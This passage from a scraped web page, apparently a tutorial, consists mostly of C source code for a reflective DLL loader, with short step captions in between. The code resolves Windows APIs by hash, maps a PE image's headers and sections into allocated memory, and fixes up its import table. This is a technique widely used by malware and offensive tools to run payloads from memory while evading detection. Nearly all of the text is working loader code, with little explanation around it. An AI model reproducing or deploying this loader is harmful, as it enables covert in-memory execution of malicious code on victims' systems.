</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfNameOrdinals);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usCounter = 1;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // loop while we still have imports to find<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; while (usCounter &gt; 0)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // compute the hash values for this function name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dwHashValue = hash((char*)(uiBaseAddress + DEREF_32(uiNameArray)));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // if we have found a function we want we get its virtual address<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of addresses<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // use this functions name ordinal as an index into the array of name pointers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // store this functions VA<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (dwHashValue == NTFLUSHINSTRUCTIONCACHE_HASH)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pNtFlushInstructionCache = (NTFLUSHINSTRUCTIONCACHE)(uiBaseAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // decrement our counter<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; usCounter--;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next exported function name<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray += sizeof(DWORD);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next exported function name ordinal<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameOrdinals += sizeof(WORD);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // we stop searching when we have found everything we need.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; if (pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache &amp;&amp; pVirtualProtect)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; break;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // get the next entry<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueA = DEREF(uiValueA);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; ```<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">Next, reserve and commit memory, copy headers, and prepare to fix up the image.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">```c<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">// STEP 2: load our image into a new permanent location in memory...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // get the VA of the NT Header for the PE to be loaded<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // allocate all the memory for the DLL to be loaded into. we can load at any address because we will &nbsp;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiBaseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // we must now copy over the headers<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfHeaders;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueB = uiLibraryAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueC = uiBaseAddress;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; while (uiValueA--)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; *(BYTE*)uiValueC++ = *(BYTE*)uiValueB++;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // Set headers protection to Read only.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)uiHeaderValue;</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Load each section at its VirtualAddress and copy its raw bytes.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_1t8qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// STEP 3: load in all of our sections...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // uiValueA = the VA of the first section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueA = ((ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.SizeOfOptionalHeader);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // itterate through all sections, loading them into memory.<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;FileHeader.NumberOfSections;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; while (uiValueE--)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueB is the VA for this section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueB = (uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueC if the VA for this sections data<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;PointerToRawData);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // copy the section over<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)-&gt;SizeOfRawData;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; while (uiValueD--)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; *(BYTE*)uiValueB++ = *(BYTE*)uiValueC++;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the next section<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueA += sizeof(IMAGE_SECTION_HEADER);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Walk the import table and write resolved addresses into the IAT.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle bg-tint-subtle theme-bold-tint:bg-tint-base theme-muted:bg-tint-base p-2 text-tint-strong [grid-area:2/1] contrast-more:border-tint contrast-more:bg-tint-base circular-corners:rounded-2xl rounded-corners:rounded-xl straight-corners:rounded-xs depth-subtle:shadow-xs"><code id="_R_218qav5ukqiv5ubsnpfivb_" class="inline-grid max-h-full min-w-full grid-cols-[auto_1fr] [count-reset:line] print:whitespace-pre-wrap [[aria-expanded=false]_&amp;]:mask-b-from-50%"><span class="highlight-line"><span class="highlight-line-content">// STEP 4: process our images import table...<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // uiValueB = the address of the import directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueB = (ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // we assume their is an import table to process<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // uiValueC is the first entry in the import table<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; uiValueC = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; // itterate through all imports<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // use LoadLibraryA to load the imported module into memory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;Name));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueD = VA of the OriginalFirstThunk<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueD = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;OriginalFirstThunk);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueA = (uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)-&gt;FirstThunk);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // itterate through all imported functions, importing by ordinal if no name present<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; while (DEREF(uiValueA))<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // sanity check uiValueD as some compilers only import by FirstThunk<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (uiValueD &amp;&amp; ((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the modules NT Header<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // uiNameArray = the address of the modules export directory entry<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiNameArray = (ULONG_PTR) &amp; ((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of the export directory<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA for the array of addresses<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;AddressOfFunctions);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // use the import ordinal (- export ordinal base) as an index into the array of addresses<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)-&gt;u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)-&gt;Base) * sizeof(DWORD));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // patch in the address for this imported function<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; else<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the VA of this functions import by name struct<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueB = (uiBaseAddress + DEREF(uiValueA));<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // use GetProcAddress and patch in the address for this imported function<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)-&gt;Name);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // get the next imported function<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueA += sizeof(ULONG_PTR);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if (uiValueD)<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; uiValueD += sizeof(ULONG_PTR);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; }<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">  <!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; // get the next import<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; &nbsp; &nbsp; uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);<!-- -->
</span></span><span class="highlight-line"><span class="highlight-line-content">&nbsp; &nbsp; }</span></span></code></pre></div><!--/$--><p class="has-[.button,input]:flex has-[.button,input]:flex-wrap has-[.button,input]:gap-2 has-[.button,input]:items-center mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-api-block:ml-0 text-start self-start justify-start">Apply relocations appropriate to the target architecture.</p><!--$--><div aria-busy="false" class="group/codeblock shiki grid shrink grid-flow-col overflow-hidden mx-auto page-width-wide:mx-0 w-full decoration-primary/6 max-w-3xl print:break-inside-avoid page-width-wide:max-w-full page-api-block:ml-0" data-color-scheme="light dark"><div class="flex items-center justify-start gap-2 text-sm [grid-area:1/1]"></div><button type="button" class="button group/button inline-flex items-center gap-2 rounded-xl straight-corners:rounded-none circular-corners:rounded-3xl border border-tint hover:border-tint-hover disabled:border-tint depth-subtle:shadow-xs hover:depth-subtle:shadow-md focus-visible:depth-subtle:shadow-md active:depth-subtle:shadow-xs shadow-tint/6 dark:shadow-tint-1 not-focus-visible:outline-0 contrast-more:border-tint-12 contrast-more:hover:outline-2 contrast-more:hover:outline-tint-12 contrast-more:hover:border-tint-12 contrast-more:focus-visible:border-tint-12 contrast-more:focus-visible:outline-tint-12 hover:depth-subtle:-translate-y-px focus-visible:depth-subtle:-translate-y-px data-[state=open]:depth-subtle:-translate-y-px active:depth-subtle:translate-y-0 transition-all grow-0 shrink-0 truncate max-w-full align-middle disabled:cursor-not-allowed disabled:translate-y-0! disabled:shadow-none! bg-tint depth-flat:bg-transparent text-tint hover:bg-tint-hover hover:not-disabled:depth-flat:bg-tint-hover hover:not-disabled:text-tint contrast-more:bg-tint-subtle disabled:bg-transparent disabled:text-tint/8 p-1 text-sm/tight rounded-corners:rounded-lg px-2 z-2 mt-2 mr-2 self-start justify-self-end leading-none opacity-0 backdrop-blur-md [grid-area:2/1] group-hover/codeblock:opacity-11 translate-y-0! print:hidden"><span class="button-content truncate">Copy</span></button><pre class="relative overflow-auto border border-tint-subtle 